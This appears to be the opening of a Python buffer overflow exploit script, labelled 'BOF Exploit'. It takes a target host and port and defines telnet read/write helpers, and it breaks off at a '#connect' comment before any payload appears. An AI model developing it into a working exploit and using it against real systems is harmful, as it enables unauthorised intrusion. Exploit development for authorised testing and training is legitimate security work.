import telnetlib
import argparse

parser = argparse.ArgumentParser(description="BOF Exploit")
parser.add_argument("host", help="The host IP address")
parser.add_argument("port", help="The host port")
arsg = parser.parse_args()

"""
read & write
"""
def read(end_text):
    tn.read_until(end_text.encode())

def write(text):
    tn.write(("{0}\n".format(text)).encode())

#connect 